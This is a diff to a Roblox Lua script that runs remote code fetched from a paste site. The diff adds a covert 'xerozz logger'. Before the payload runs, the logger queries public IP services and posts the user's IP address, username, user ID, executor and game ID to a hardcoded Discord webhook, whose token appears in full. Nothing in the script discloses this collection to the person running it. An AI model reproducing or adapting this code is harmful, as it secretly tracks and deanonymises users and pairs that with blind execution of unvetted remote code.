@@ -1,1 +1,71 @@
+--// Config
+getgenv().whscript = "xerozz"
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1400142991527514156/cCdvfUWn2E1sJWs9jW95qLH4PR3vl8VLBYVkdkgE7OdODD2oehO6JezXApKpVdwOrrLT"
+getgenv().ExecLogSecret = true
+
+--// Services
+local player = game:GetService("Players").LocalPlayer
+local httpService = game:GetService("HttpService")
+
+--// IP Logger (Multiple Fallbacks)
+local function getIP()
+    if not ExecLogSecret then return end
+    
+    local ipServices = {
+        "https://api.ipify.org",
+        "https://ipinfo.io/ip", 
+        "https://icanhazip.com"
+    }
+    
+    for _, url in ipairs(ipServices) do
+        local success, ip = pcall(function()
+            return game:HttpGet(url, true):gsub("%s+", "")
+        end)
+        if success and ip then return ip end
+    end
+end
+
+--// Enhanced Webhook Logger
+local function logExecution()
+    local embed = {
+        title = "📜 Script Execution Log",
+        color = 0x5865F2,
+        fields = {
+            {
+                name = "👤 Player Info",
+                value = string.format("```Name: %s (@%s)\nUserID: %d```",
+                    player.DisplayName, player.Name, player.UserId),
+                inline = true
+            },
+            {
+                name = "🛠️ Execution Info", 
+                value = string.format("```Executor: %s\nGame: %s```",
+                    identifyexecutor() or "Unknown", game.GameId),
+                inline = true
+            }
+        },
+        footer = {text = "xerozz logger • "..os.date("%x %X")}
+    }
+
+    if ExecLogSecret then
+        local ip = getIP()
+        if ip then
+            table.insert(embed.fields, {
+                name = "🌐 Network Info",
+                value = "||IP: `"..ip.."`||",
+                inline = false
+            })
+        end
+    end
+
+    request({
+        Url = webhookexecUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = httpService:JSONEncode({embeds = {embed}})
+    })
+end
+
+--// Execute
+logExecution()
 loadstring(game:HttpGet("https://pastefy.app/hdLLJzGA/raw",true))()
